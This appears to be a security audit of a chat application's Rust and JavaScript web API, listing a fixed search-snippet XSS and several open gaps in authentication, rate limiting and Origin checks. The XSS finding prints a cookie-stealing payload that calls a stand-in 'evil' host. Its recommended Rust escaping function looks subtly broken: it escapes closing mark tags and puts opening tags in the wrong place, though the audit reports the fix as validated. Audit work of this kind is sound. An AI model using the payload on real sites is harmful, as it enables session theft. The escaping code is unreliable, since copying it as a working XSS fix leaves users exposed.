# Security Audit Part 2 (2026-05-17)

Focus: remaining gaps after initial hardening pass.

## HIGH

### 1. Search Snippet XSS (chat-search)

- Status: FIXED
- Files:
  - src/chat_storage.rs (snippet generation)
  - static/js/features/chat-search.js (snippet rendering)
- Issue:
  - Backend uses SQLite's snippet() to generate search highlights.
  - Snippet wraps message content in <mark> tags.
  - Message content is not HTML-escaped before snippet().
  - Frontend injects snippet via innerHTML without sanitization.
- Impact:
  - Stored XSS via chat messages.
  - Attacker can:
    - Read user’s chat, tokens, settings.
    - Perform actions as the user.
- Likelihood:
  - Medium-high: DOMPurify is used in some modules (chat-render, dashboard-render) but not in chat-search.
- Attack example:
  - User sends: `search <img src=x onerror=fetch("https://evil/?c="+document.cookie)> here`
  - snippet() returns: `…search <img src=x onerror=fetch("https://evil/?c="+document.cookie)> here…`
  - chat-search.js injects via innerHTML → script executes.
- Recommended Fix:
  - Primary (preferred, defense-in-depth):
    - HTML-escape the snippet in the backend while preserving <mark> tags.
    - In src/chat_storage.rs, after retrieving the snippet:

      fn escape_html_except_mark(s: &str) -> String {
          s.split("<mark>")
              .enumerate()
              .flat_map(|(i, seg)| {
                  let escaped = seg
                      .replace('&', "&amp;")
                      .replace('<', "&lt;")
                      .replace('>', "&gt;")
                      .replace('"', "&quot;");
                  if i == 0 {
                      vec![escaped]
                  } else {
                      vec![escaped, "<mark>".to_string()]
                  }
              })
              .collect()
      }

      // In search() row mapping:
      let raw_snippet: String = row.get(4)?;
      let snippet = escape_html_except_mark(&raw_snippet);
      Ok(SearchResult { snippet, .. })

    - Rationale:
      - Guarantees safe HTML for all consumers of /api/chat/search.
      - Survives future frontend changes.
      - Does not depend on DOMPurify in the search module.
  - Secondary (belt-and-suspenders):
    - Sanitize snippet in chat-search.js using DOMPurify:

      const safeSnippet =
          (typeof window.DOMPurify !== 'undefined'
              ? window.DOMPurify.sanitize(snippet, { ALLOWED_TAGS: ['mark'] })
              : snippet);

      card.innerHTML =
          `...
           <div class="csp-search-result-snippet">${safeSnippet}</div>`;

    - Rationale:
      - Adds frontend protection in case snippet contents are ever reused or misused.
- Mitigation Applied (2026-05-17):
  - Backend (src/chat_storage.rs):
    - Added escape_html_except_mark to HTML-escape snippet content while preserving <mark> tags.
  - Frontend (static/js/features/chat-search.js):
    - Added DOMPurify.sanitize(snippet, { ALLOWED_TAGS: ['mark'] }) as secondary guard.
  - Screenshots validated:
    - sidebar-fts-search-active.png and sidebar-fts-search-results.png confirm highlights still render correctly.
- Remaining Risk:
  - Low: no other snippet-based XSS vectors identified.

### 2. Unprotected Remote-Agent Endpoints

- Status: OPEN
- Files:
  - src/web/api.rs (remote-agent endpoints: install, start, status, stop, remove, ssh-host-key, ssh-trust, detect)
- Issue:
  - All remote-agent endpoints are unprotected (no api-token or db-admin-token required).
  - Reachable from any client on the network.
  - An attacker could:
    - Install/start/stop/remove agents.
    - Trigger expensive SSH operations.
    - Modify host keys/trust.
- Impact:
  - High: potential for disruption and unauthorized changes.
- Likelihood:
  - Medium: if exposed on LAN or via reverse proxy.
- Fix:
  - Require api-token for all remote-agent endpoints.
  - Require db-admin-token for:
    - install
    - remove
- Next Steps:
  - Add api-token auth to all remote-agent endpoints.
  - Add db-admin-token auth to install/remove.
  - Update frontend to send correct tokens.
  - Update reference docs.

### 3. Unprotected Session CRUD Endpoints

- Status: OPEN
- Files:
  - src/web/api.rs (session CRUD: GET/POST /api/sessions, DELETE /api/sessions/:id, GET /api/sessions/active)
- Issue:
  - All session endpoints are unprotected (no api-token or db-admin-token required).
  - Reachable from any client on the network.
  - An attacker could:
    - List/create/delete sessions.
    - Exhaust sessions.
- Impact:
  - Medium: disruption and data exposure.
- Likelihood:
  - Medium: if exposed on LAN or via reverse proxy.
- Fix:
  - Require api-token for all session endpoints.
- Next Steps:
  - Add api-token auth to all session endpoints.
  - Update frontend to send correct tokens.
  - Update reference docs.

## MEDIUM

### 4. Missing Rate Limits on Expensive Endpoints

- Status: OPEN
- Files:
  - src/web/api.rs (remote-agent install/start/stop/remove, session CRUD, file browser, chat-search)
- Issue:
  - Remote-agent install/start/stop/remove: no per-endpoint cooldown; can be spammed with expensive SSH.
  - Session CRUD: no rate limit; could be spammed to exhaust sessions.
  - File browser: no rate limit; could be abused for slow DoS via large directory listings.
  - Chat-search: no per-endpoint rate limit beyond global rules; could be used for resource exhaustion.
- Impact:
  - Denial of service.
- Likelihood:
  - Medium: if exposed on LAN or via reverse proxy.
- Fix:
  - Add per-endpoint cooldowns:
    - Remote-agent install/start/stop/remove: 10–30s cooldown.
    - Session CRUD: lightweight rate limit or cooldown.
    - File browser: lightweight rate limit or cooldown.
    - Chat-search: lightweight rate limit or cooldown.
- Next Steps:
  - Implement per-endpoint cooldowns.
  - Update reference docs.

### 5. Unprotected Chat and Chat-Search Endpoints

- Status: OPEN
- Files:
  - src/web/api.rs (chat and chat-search endpoints)
- Issue:
  - Chat and chat-search endpoints are unprotected (no api-token or db-admin-token required).
  - Reachable from any client on the network.
  - An attacker could:
    - Send chat requests.
    - Perform resource exhaustion.
- Impact:
  - Medium: disruption and data exposure.
- Likelihood:
  - Medium: if exposed on LAN or via reverse proxy.
- Fix:
  - Require api-token for chat and chat-search endpoints.
- Next Steps:
  - Add api-token auth to chat and chat-search endpoints.
  - Update frontend to send correct tokens.
  - Update reference docs.

## LOW

### 6. Same-Origin Assumptions

- Status: OPEN
- Files:
  - src/web/api.rs (all endpoints)
- Issue:
  - Many endpoints rely on “same-origin only” assumptions.
  - This is by design (local-first), but:
    - Not all endpoints enforce Origin checks.
    - Not all endpoints use strict CORS policies.
- Impact:
  - Low: potential for CSRF or cross-origin attacks.
- Likelihood:
  - Low: depends on deployment.
- Fix:
  - Add Origin checks to:
    - All endpoints that modify state.
    - All endpoints that access resources.
  - Use strict CORS policies.
- Next Steps:
  - Implement Origin checks.
  - Update reference docs.
